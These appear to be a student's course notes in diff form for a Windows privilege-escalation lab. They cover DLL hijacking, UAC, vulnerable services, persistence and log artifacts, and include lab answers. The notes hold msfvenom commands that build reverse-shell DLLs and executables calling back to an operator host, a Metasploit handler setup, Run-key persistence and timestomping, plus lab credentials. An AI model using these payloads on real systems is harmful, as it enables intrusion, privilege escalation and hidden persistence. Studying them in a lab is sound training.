@@ -1,0 +1,235 @@
+#DAY 7 Windows explotation 
+
+____________________________________________________________________________________________
+#Privilege Escalation, Persistence & Covering Your Tracks 
+
+#Windows Access Control Model
+
+    Access Tokens
+
+        Security Identifier (SID) associations and Token associations
+
+    Security Descriptors
+
+        DACL
+
+        SACL
+
+        ACEs
+
+#DLL Search Order 
+
+	Executable check the following locations (in successive order):
+	
+	reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session 		Manager\KnownDLLs
+
+		The directory the the Application was run from
+			C:\Users\Public\Downloads
+		The directory specified in in the C+ function GetSystemDirectory()
+	    		C:\Windows\system32	
+		The directory specified in the C+ function GetWindowsDirectory()
+			C:\Windows
+		The current directory
+
+#UAC
+
+	    Always Notify
+
+	    Notify me only when programs try to make changes to my computer
+
+	    Notify me only when programs try to make changes to my computer (do not 		    dim my desktop)
+
+	    Never notify
+
+	Admin get two token usually uses user token but run sokething as 		administartor uses admin token	
+
+	check registry:
+	
+	reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+	
+		by default enabled if another user log on notfified that user
+		
+#AutoElevate Executables	
+
+	asInvoker
+	
+		 sigcheck -m C:\windows\System32\calc.exe
+		 strings C:\windows\System32\calc.exe
+		 
+		     <requestedPrivileges>
+
+            <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
+		 
+	highestAvailable
+
+
+            <requestedExecutionLevel
+
+                level="highestAvailable"
+
+                uiAccess="false"
+
+#Privilege Escalation 
+
+	
+
+
+	1.schtasks /query /fo LIST /v | Select-String -pattern "Task To Run" 		-CaseSensitive | Select-String -pattern "COM Handler" -NotMatch
+
+		run sighcheck to find version to find ddl hijacking is vuln 
+		for one of them
+		
+	2.sigcheck C:\Users\student\balh\malware <-- to get version 
+	
+	3.icacls <path>
+	
+		F - Full access <-- checks to see if can write in directory 
+		now to find vuln dll
+	
+	4.PROC MON
+		process monitor filter 
+		
+			process name contains putty.exe
+			path contains .dll
+			result contains NAME NOT FOUND 
+			
+			look for processaqnme of task and path of the dll thats vuln
+
+	5.msfvenom -p windows/shell_reverse_tcp LHOST=<linux opps> LPORT=4444
+		-f dll > WINMM.dll
+		
+	OR
+	
+	5. msfvenom -p windows/exec CMD="cmd.exe /C whoami > C:\\whoami.txt" LHOST=
+	 10.50.33.232 LPORT=4444 -f dll > SSPICLI.dll
+		
+		scp WINMM.dll student@10.50.33.232:/C:/users/stduent/exercise <--
+		same path of the og dll 
+
+#VULNERABLE SERVICES
+
+	msfvenom -p windows/shell_reverse_tcp LHOST=10.50.33.232 LPORT=4444 -f exe 		> <something>.exe <--rm executable can do it replacing with custom bad one 
+
+#Persistence 
+
+	Registry:
+	
+		KEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
+
+		    	Run
+
+		    	RunOnce
+
+		HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\
+
+		   	 Run
+
+		    	 RunOnce	
+
+	Tasks
+	services
+	
+	Logs:
+	
+		 Artifacts
+
+			Determine which events will create a log
+
+			Event Logs
+
+				Applications, Security, Setup, System
+
+	 	Blending In
+
+	   	TimeStomping
+	   	
+	   
+#Important Microsoft Event IDs
+
+	4624/4625 Successful/failed login
+
+	4720 Account created
+
+	4672 Administrative user logged on
+
+	7045 Service created
+
+____________________________________________________________________________________
+
+#DAY 7 WINDOWS PRIVILEGE ESCLATION ACTIVTIES
+
+Scheme of Maneuver:
+>Jump Box
+->Pivot: 192.168.28.105 ftp.site.donovia comrade :: StudentReconPassword 2222
+-->T1: 192.168.28.5 donovian-windows-private comrade :: StudentPrivPassword 3389
+
+
+q1.What service is causing a error level log for 31 May between 1200-1330 hrs. System log file is located under comrade's directory.
+
+	used port 3389 rdp to rdp to the T1 after setting up all tunnels and using 		passive recon
+	went to comrade directory open the system event log 
+	service control manager event id 7045 
+	in general pane servcie name:
+	Fortnite MMO
+	cmd /C c:\windows\system32\fortnite.exe -lp 48334 -e cmd.exe
+
+q2.Using the same "system.evtx" log, what was the date the offending service was first created? Provide answer in the following format: YYYY-MM-DD
+
+	the same log look at the date that was date it was installed
+	2019-05-31 
+
+q3.Using the same "system.evtx" log, is this a legitimate Windows service? To correctly answer the question enter Y or N.
+
+	N
+	cmd /C c:\windows\system32\fortnite.exe -lp 48334 -e cmd.exe
+	
+q4.Using the same "system.evtx" log, The system time has changed, what is the new year?
+
+	filter off date 
+	go to bottom 2230
+	
+q5.Analyze the System and identify the means to escalate your privileges. Report the "status" of your finding by entering the correct Display Name.
+
+	services.exe
+	service without a display name 
+	Memory status 
+	
+q6.What Account will it utilize at Log on?
+
+	lat tab in category
+	LocalSystem
+	
+q7.What type of escalation can you perform with your findings?
+	
+	DLL Hijacking
+	
+q8.What is the name of the DLL that is supposed to be loaded, by the vulnerable service?
+	
+	the file path given by services was C:\memorystatus\service.exe in the 
+	memorystatus their was to text documents and the eecutable the service.c 
+	once open in notepad can ctrl f for .dll look up or down hijackmeplz.dll
+	
+q9.get admin access through dll hijacking
+
+	in linux make dll called hijackmeplz.dll put
+	msfvenom -p windows/shell_reverse_tcp LHOST=10.50.x.x LPORT=4444 -f dll > 		hijackmeplz.dll
+	we know based off the previous question that hijackmeplz.dll is the
+	dll that the service looks for when ran we half to restart it 
+	automatically runs it based off service info found in begiunning questions 
+	servies.exe memory sttaus so made the dll sent it over 
+	through scp from their machine and restarted the machine 
+	on our linux side set up msfconsole
+	use multi/handler
+	set payload windows/shell_reverse_tcp
+	set lhost 0.0.0.0
+	set lport 4444
+	run
+	enum admin desktop from shell finf flag.txt
+	
+	
+	
+	
+	
+	
+	
+	
